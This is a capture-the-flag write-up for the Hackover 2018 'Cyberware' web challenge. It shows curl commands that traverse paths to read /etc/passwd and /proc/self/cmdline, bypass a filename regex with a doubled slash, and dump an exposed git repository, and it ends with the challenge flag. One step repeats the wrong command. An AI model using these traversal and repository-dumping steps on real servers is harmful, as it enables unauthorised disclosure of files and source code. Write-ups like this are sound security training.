## Cyberware
#### challenge
```
We have some nice ASCII animals that we want to show you. As we take animal protection very seriously we have rolled out our WAF beta test of Cyberware application protector to protect the cuties.

Just carry on, this one is unbreakable.

http://cyberware.ctf.hackover.de:1337
```

### references
[original write-up](https://security.meta.stackexchange.com/questions/3077/write-ups-hackover-ctf-2018-fri-05-oct-2000-utc-sun-07-oct-1000-utc/3087#3087)

[original write-up](https://infosec.rm-it.de/2018/10/07/hackover-ctf-2018-cyberware/)

[original write-up](https://github.com/p4-team/ctf/tree/master/2018-10-06-hackover/web_cyberware)

### idea

The ASCII images are not displayed in firefox, but curl shows them:
```
$ curl http://cyberware.ctf.hackover.de:1337/cat.txt
<pre>
   ____
  (.   \
    \  |
     \ |___(\--/)
   __/    (  . . )
  "'._.    '-.O.'
       '-.  \ "|\
          '.,,/'.,,
</pre>
curl: (18) transfer closed with 33 bytes remaining to read
```
Then /etc/passwd is accessed with:
```
$ curl http://cyberware.ctf.hackover.de:1337//etc/passwd
root:x:0:0:root:/root:/bin/ash
[...]
ctf:x:1000:1000::/home/ctf:
```
The next step is getting more information about the process:
```
$ curl http://cyberware.ctf.hackover.de:1337//proc/self/cmdline -v --output -
*   Trying 207.154.227.199...
* TCP_NODELAY set
* Connected to cyberware.ctf.hackover.de (207.154.227.199) port 1337 (#0)
> GET //proc/self/cmdline HTTP/1.1
> Host: cyberware.ctf.hackover.de:1337
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 200 Yippie
< Server: Linux/cyber
< Date: Wed, 10 Oct 2018 20:12:46 GMT
< Content-type: text/cyber
< Content-length: 67
<
* transfer closed with 33 bytes remaining to read
* stopped the pause stream!
* Closing connection 0
curl: (18) transfer closed with 33 bytes remaining to read
/usr/bin/python3./cyberserver.py
```
The sourcecode is obtained with:
```
$ curl http://cyberware.ctf.hackover.de:1337//proc/self/cmdline -v --output -
```
The output is in [cyberserver.py](cyberserver.py).
The source tries to block directories, but especially a flag.git directory:
```
        if path.endswith('/'):
            self.send_response(403, 'You shall not list!')
            self.send_header('Content-type', 'text/cyber')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
[...]
        if path.startswith('flag.git') or search('\\w+/flag.git', path):
            self.send_response(403, 'U NO POWER')
            self.send_header('Content-type', 'text/cyber')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
```
Following:
```
$ curl http://cyberware.ctf.hackover.de:1337//home/ctf/flag.git/HEAD -v
[...]
< HTTP/1.1 403 U NO POWER
[...]
```
Therefore we need to bypass the flag regex ```\\w+/flag.git```. Introducing another slash does that:
```
$ curl http://cyberware.ctf.hackover.de:1337//home/ctf//flag.git/HEAD
ref: refs/heads/master
```
You can download the git files either with https://github.com/internetwache/GitTools or a simple script:
```
mkdir -p temp/.git
cd temp/.git/
mkdir -p refs/remotes/origin objects/info logs/refs/remotes/origin logs/refs/heads objects/pack/ info refs/heads refs/master
for x in HEAD objects/info/packs description config COMMIT_EDITMSG index packed-refs refs/heads/master refs/remotes/origin/HEAD refs/stash logs/HEAD logs/refs/heads/master logs/refs/remotes/origin/HEAD refs/stash logs/HEAD logs/refs/heads/master logs/refs/remotes/origin/HEAD info/refs info/exclude; do curl http://cyberware.ctf.hackover.de:1337//home/ctf//flag.git/$x -o $x ; done
```
And grabbing the packs:
```
$ cat .git/objects/info/packs
P pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.pack
$ curl http://cyberware.ctf.hackover.de:1337//home/ctf//flag.git/objects/pack/pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.pack -o objects/pack/pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.pack
```
Using the ```GitTools/Extractor/extractor.sh temp/ extract``` we obtain files and the flag.

### flag
hackover18{Cyb3rw4r3_f0r_Th3_w1N}

[more write-ups](../../)
